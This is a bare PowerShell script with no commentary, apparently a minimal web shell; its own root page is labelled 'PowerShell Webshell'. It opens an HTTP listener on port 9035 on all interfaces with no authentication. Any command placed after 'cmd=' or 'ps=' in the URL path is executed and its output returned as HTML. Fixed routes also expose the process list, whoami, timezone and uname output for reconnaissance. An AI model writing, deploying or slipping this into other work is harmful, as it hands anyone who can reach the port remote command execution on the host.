$url = 'http://+:9035/'

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

try
{
  while ($listener.IsListening) {  
    $context = $listener.GetContext()
    $Request = $context.Request
    $Response = $context.Response

    if($request.url.localpath -like "*cmd=*"){
      $r = $request.url.localpath -Split '='
      $received = '{0} {1}' -f $Request.httpmethod, $r[0]
      $out = &$r[1]
      $htmlcontents = @{
        'GET /cmd' = ConvertTo-Html -precontent $out
      }
      $html = $htmlcontents[$received]
    }
    elseif($request.url.localpath -like "*ps=*"){
      $r = $request.url.localpath -Split '='
      $received = '{0} {1}' -f $Request.httpmethod, $r[0]
      $htmlcontents = @{
        'GET /ps' = &$r[1] | ConvertTo-Html 
      }
      $html = $htmlcontents[$received]
    }
    else{
      $received = '{0} {1}' -f $Request.httpmethod, $Request.url.localpath
      $htmlcontents = @{
        'GET /'  =  '<html><building>PowerShell Webshell</building></html>'
        'GET /proc'  =  Get-process | ConvertTo-Html
        'GET /w' = whoami
        'GET /tz' = get-timezone 
        'GET /u' = uname -a
      }
      $html = $htmlcontents[$received]
    }
    if ($html -eq $null) {
      $Response.statuscode = 404
      $html = 'Page not available!'
    } 

    $buffer = [Text.Encoding]::UTF8.GetBytes($html)
    $Response.ContentLength64 = $buffer.length
    $Response.OutputStream.Write($buffer, 0, $buffer.length)
    
    $Response.Close()
  }
}
finally
{
  $listener.Stop()
}